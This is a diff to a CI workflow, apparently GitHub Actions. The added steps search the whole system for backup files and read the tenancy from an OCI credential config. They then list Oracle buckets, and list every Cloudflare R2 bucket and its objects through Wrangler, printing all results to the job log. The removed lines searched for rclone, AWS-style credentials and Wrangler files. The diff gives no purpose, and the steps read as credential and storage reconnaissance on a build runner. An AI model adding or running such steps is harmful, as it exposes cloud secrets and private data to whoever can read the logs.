@@ -26,14 +26,29 @@ jobs:
             echo "=== Searching entire system for backup files (*.tar.gz.enc or *db*.sql) ==="
             sudo find / -name "*.tar.gz.enc" -o -name "*db*.sql" -o -name "*backup*.sql" 2>/dev/null | grep -v "/proc\|/sys\|/overlay" || echo "No backup files found."
             
-            echo "=== Checking for OCI CLI ==="
-            if command -v oci &> /dev/null; then
-              echo "OCI CLI found! Checking configs..."
-              ls -la ~/.oci 2>/dev/null || echo "No ~/.oci found for ubuntu"
-              sudo ls -la /root/.oci 2>/dev/null || echo "No ~/.oci found for root"
+            echo "=== Checking for OCI CLI again ==="
+            OCI_PATH=$(find /home /root /opt -name "oci" -type f -executable 2>/dev/null | head -n 1)
+            if [ -n "$OCI_PATH" ]; then
+              echo "OCI CLI found at: $OCI_PATH"
+              $OCI_PATH os bucket list --compartment-id "$($OCI_PATH setup repair-file-permissions >/dev/null 2>&1; cat ~/.oci/config | grep tenancy | cut -d '=' -f2)" 2>/dev/null || echo "Could not list OCI buckets."
             else
-              echo "OCI CLI not installed."
+              echo "OCI CLI executable not found."
             fi
             
-            echo "=== Checking for Cloudflare/AWS/Rclone/Wrangler configs ==="
-            sudo find /home /root -name "rclone.conf" -o -name "credentials" -o -name ".wrangler" 2>/dev/null
+            echo "=== Checking Cloudflare R2 with Wrangler ==="
+            export WRANGLER_SEND_METRICS=false
+            if [ -d "$HOME/.config/.wrangler" ] || [ -d "/root/.config/.wrangler" ]; then
+              echo "Wrangler config found! Listing R2 buckets..."
+              BUCKETS=$(npx wrangler@latest r2 bucket list 2>/dev/null | grep -v 'Wrangler' | grep -v 'npm' || true)
+              echo "$BUCKETS"
+              
+              # Extract bucket names and list objects for each
+              echo "$BUCKETS" | grep '"name":' | awk -F '"' '{print $4}' | while read BUCKET; do
+                if [ -n "$BUCKET" ]; then
+                  echo "--- Objects in Bucket: $BUCKET ---"
+                  npx wrangler@latest r2 object list "$BUCKET" 2>/dev/null || echo "Failed to list objects in $BUCKET"
+                fi
+              done
+            else
+              echo "No Wrangler configuration found to authenticate R2."
+            fi
